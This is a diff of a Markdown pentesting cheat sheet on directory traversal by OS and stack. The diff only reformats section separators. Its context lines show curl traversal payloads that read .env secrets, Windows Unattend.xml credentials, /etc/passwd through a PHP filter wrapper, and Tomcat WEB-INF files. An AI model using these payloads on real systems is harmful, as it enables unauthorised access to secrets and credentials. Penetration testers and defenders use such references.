@@ -17,7 +17,7 @@ linked:
 ---
 # Directory Traversal - Vectores por OS / Stack
 
-***
+---
 
 ## Linux Objetivos de Alto Valor
 
@@ -54,7 +54,7 @@ linked:
 | `curl 'https://target/?file=../../../var/www/html/.env'` | Modern app .env secrets | Modern app secrets. |
 ^pt-stack-linux
 
-___
+---
 
 ## Windows Objetivos de Alto Valor
 
@@ -82,7 +82,7 @@ ___
 | `curl 'https://target/?file=..\..\..\Windows\Panther\Unattend.xml'` | Unattended install creds | Build artifact. |
 ^pt-stack-windows
 
-___
+---
 
 ## PHP Wrappers (Path Traversal + LFI)
 
@@ -107,7 +107,7 @@ ___
 | `python3 -c "from urllib.parse import quote; print(quote('php://filter/convert.base64-encode/resource=/etc/passwd'))"` | Encode wrapper for query param | Encode helper. |
 ^pt-stack-php-wrappers
 
-___
+---
 
 ## Java Path Handling
 
@@ -130,7 +130,7 @@ ___
 | `curl 'https://target/..;/WEB-INF/web.xml'` | Tomcat `..;/` + WEB-INF leak | Combined. |
 ^pt-stack-java
 
-___
+---
 
 ## Node.js / Express Path Quirks
 
@@ -152,4 +152,4 @@ ___
 | `node -e "const path = require('path'); console.log(path.join('/var/www/', '../../etc/passwd'))"` | Local Node path.join PoC | Reproduce locally. |
 ^pt-stack-node
 
-***
+---
